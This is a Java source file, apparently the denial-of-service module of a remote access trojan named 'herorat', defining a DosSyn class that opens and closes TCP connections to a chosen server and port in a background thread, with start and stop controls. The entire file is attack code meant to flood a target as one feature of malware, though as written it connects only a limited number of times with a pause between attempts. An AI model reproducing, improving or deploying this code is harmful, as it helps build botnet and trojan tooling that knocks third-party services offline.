package net.herorat.features.dos;

import java.net.Socket;

public class DosSyn implements DosInterface
{
	private String server;
	private int port;
	private int threads;
	private Thread dos;
	private boolean attacking;
	
	public DosSyn(String server, int threads, int port)
	{
		this.server = server;
		this.port = port;
		this.threads = threads;
		this.attacking = false;
		
		this.dos = new Thread()
		{
			@Override
			public void run()
			{
				for (int i=0; i<DosSyn.this.threads;)
				{
					if (!attacking) break;
					
					try
					{
						new Socket(DosSyn.this.server, DosSyn.this.port).close();
						i++;
						Thread.sleep(100);
					}
					catch (Exception e) {}
				}
			}
		};
	}
	
	@Override
	public void start()
	{
		this.attacking = true;
		this.dos.start();
	}
	
	@Override
	public void stop()
	{
		this.attacking = false;
	}
}